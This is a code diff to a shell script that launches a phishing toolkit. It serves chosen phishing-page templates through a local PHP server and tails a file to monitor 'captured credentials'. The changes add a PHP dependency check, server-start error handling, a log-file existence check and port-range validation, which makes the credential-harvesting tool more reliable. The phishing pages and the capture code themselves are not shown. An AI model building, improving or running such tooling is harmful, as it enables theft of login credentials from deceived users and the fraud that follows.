@@ -25,6 +25,11 @@ EOF
     echo -e "\033[1;34m----------------------------------\033[0m"
 }
 
+# Function to check dependencies
+check_dependencies() {
+    command -v php >/dev/null 2>&1 || { echo >&2 "PHP is required but it's not installed. Aborting."; exit 1; }
+}
+
 # Function to start the phishing server
 start_server() {
     local template=$1
@@ -33,15 +38,27 @@ start_server() {
     echo -e "\nStarting PHP server for $template phishing page on port $port..."
     php -S 127.0.0.1:$port -t templates/$template/ > /dev/null 2>&1 &
 
+    if [ $? -ne 0 ]; then
+        echo -e "\nFailed to start PHP server. Please check if the port is already in use or if there are permission issues."
+        exit 1
+    fi
+
     echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
     echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
 
     # Monitor the PHP server logs for captured credentials
-    echo -e "Monitoring captured credentials...\n"
-    tail -f templates/$template/websites/$template.php
+    if [ -f templates/$template/websites/$template.php ]; then
+        echo -e "Monitoring captured credentials...\n"
+        tail -f templates/$template/websites/$template.php
+    else
+        echo -e "Log file not found. Please check if the template path is correct."
+        exit 1
+    fi
 }
 
 # Main script logic
+check_dependencies
+
 while true; do
     show_menu
     read -p "Choose an option: " option
@@ -58,8 +75,8 @@ while true; do
     read -p "Enter the port number to host the website on (e.g., 8080): " port
 
     # Validate the port number
-    if ! [[ $port =~ ^[0-9]+$ ]]; then
-        echo -e "\nInvalid port number! Please enter a valid number.\n"
+    if ! [[ $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
+        echo -e "\nInvalid port number! Please enter a valid number between 1 and 65535.\n"
         continue
     fi
 
